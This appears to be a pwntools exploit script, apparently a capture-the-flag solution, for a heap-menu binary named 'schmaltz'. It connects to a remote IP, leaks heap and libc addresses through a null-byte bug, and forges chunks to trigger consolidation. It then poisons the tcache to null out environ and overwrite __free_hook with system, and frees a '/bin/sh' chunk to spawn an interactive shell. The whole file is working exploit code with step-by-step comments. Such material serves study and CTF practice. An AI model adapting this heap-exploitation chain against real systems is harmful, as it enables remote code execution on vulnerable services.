from pwn import *

#r = process("./schmaltz", env = {'LD_LIBRARY_PATH' : './'})
r = remote("52.23.219.15", 1337)

def add(size, content):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("> ")
    r.sendline(str(size))
    r.recvuntil("> ")
    r.send(content)

def view(index):
    r.recvuntil("> ")
    r.sendline("3")
    r.recvuntil("> ")
    r.sendline(str(index))

def remove(index):
    r.recvuntil("> ")
    r.sendline("4")
    r.recvuntil("> ")
    r.sendline(str(index))

libc = ELF("./libc.so.6")
free_hook_off = libc.symbols["__free_hook"]
system_off = libc.symbols["system"]
environ_off = libc.symbols["environ"]
bin_sh_off = next(libc.search("/bin/sh"))

# Add 2 tcaches
add(0x70, "A")
add(0x70, "A")
# Remove them, add a new one
remove(1)
remove(0)
add(0x70, "A")
# Leak the heap address thanks to uncleared chunks and wrong null byte handling
view(0)
r.recvuntil("Content: A")
heap = "\0" + r.recvline().strip()
heap += "\0" * (8-len(heap))
heap = u64(heap) - 0x200
log.info("heap: %s" % hex(heap))
# Remove it, back to initial state (kinda)
remove(0)
# Add 7 chunks, the 5th chunk is the setup for the fake chunk for later consolidation, then remove them all to fill up the 0x100 tcache bin
for i in range(7):
    if (i == 4):
        # The heap adresses we crafted here are fds and bks that are required for bypassing unlink and checks
        payload = "\0" * 0x10 + p64(heap + 0x830) * 2 + "\0" * 0xb8 + p64(0x361) + p64(heap + 0x760) * 2
        add(0xf0, payload)
    else:
        add(0xf0, "A")
for i in range(6,-1,-1):
    remove(i)
# Add a chunk
add(0x100, "A")
# This chunk will use the wrong null byte handler to clear the in-used bit of the next chunk
add(0x28, "AAA")
# The 0x51 of this chunk is there to fit as it's next chunk with the is-used bit cleared (from 0x111 to 0x100)
add(0x100, "\0" * 0xf8 + p64(0x51))
# The 0x51 of this chunk is there to fit as the next chunk of the fake 0x51 chunk above (it checks 2 consecutive chunks before freeing)
add(0x100, "\0" * 0x38 + p64(0x51))
# Remove the small chunk and re-add it to clear the in-used bit
remove(1)
add(0x28,"\0" * 0x20 + p64(0x360))
# Remove the corrupted chunk and consolidate it with the fake chunk set up earlier (it will consolidate because this chunk is an unsorted chunk due to full tcache bin)
remove(2)
# Add another chunk, this chunk will be in the unsorted chunk we crafted, then we can leak libc the same way as we leaked heap
add(0x170,"A")
view(3)
r.recvuntil("Content: ")
base_libc = u64(r.recv(6) + "\0\0") - 0x3b1041
log.info("base_libc: %s" % hex(base_libc))
free_hook = base_libc + free_hook_off
log.info("free_hook: %s" % hex(free_hook))
system_addr = base_libc + system_off
bin_sh_addr = base_libc + bin_sh_off
environ = base_libc + environ_off
log.info("environ: %s" % hex(environ))
# Remove some chunks, prepare for tcache corruptions
remove(3)
remove(0)
# Use the big crafted unsorted chunk to overwrite the fd of a tcache to environ, we need to set environ to NULL because the libc is custom and cannot invoke the shell
payload = "\0" * 0x98 + p64(0x101) + p64(environ) + p64(0)
add(0xb0, payload)
# Add a chunk 
add(0x100, p64(0))
# Overwrite environ with NULL
add(0x100, p64(0))
# Prepare for the next corruption to overwrite __free_hook
remove(1)
# Use the big crafted unsorted chunk to overwrite the fd of a tcache to __free_hook
payload = "\0" * 0xf0 + p64(free_hook) + p64(0)
add(0x120, payload)
# Add a chunk with /bin/sh
add(0x28, "/bin/sh\0")
# Overwrite __free_hook with system
add(0x28, p64(system_addr))
# Trigger
remove(5)

r.interactive()
